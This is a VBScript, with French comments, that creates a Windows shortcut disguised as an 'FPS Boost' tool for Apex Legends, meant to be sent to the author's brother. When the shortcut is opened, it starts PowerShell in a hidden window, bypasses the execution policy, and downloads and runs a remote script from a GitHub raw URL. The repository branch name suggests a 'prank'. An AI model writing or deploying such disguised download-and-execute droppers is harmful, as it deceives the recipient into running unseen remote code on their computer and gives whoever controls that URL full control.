' create_lnk.vbs
' Exécute ce fichier sur TON PC pour générer le .lnk a envoyer a ton frere.
' Le .lnk apparait dans le meme dossier que ce .vbs.

Dim oWS, oLink, sDir, sLnk, sCmd

Set oWS  = WScript.CreateObject("WScript.Shell")
sDir     = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))
sLnk     = sDir & "FPS_Boost_Apex.lnk"

sCmd = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
       """iwr 'https://raw.githubusercontent.com/thesangu/Aventuuuure/claude/signature-prank-replace-xhom2n/tools/blague_launcher.ps1' -UseBasicParsing | iex"""

Set oLink               = oWS.CreateShortcut(sLnk)
oLink.TargetPath        = "powershell.exe"
oLink.Arguments         = sCmd
oLink.WorkingDirectory  = sDir
oLink.WindowStyle       = 7
oLink.IconLocation      = "%SystemRoot%\system32\imageres.dll, 100"
oLink.Description       = "FPS Boost Apex Legends"
oLink.Save

WScript.Echo "Fichier cree : " & sLnk
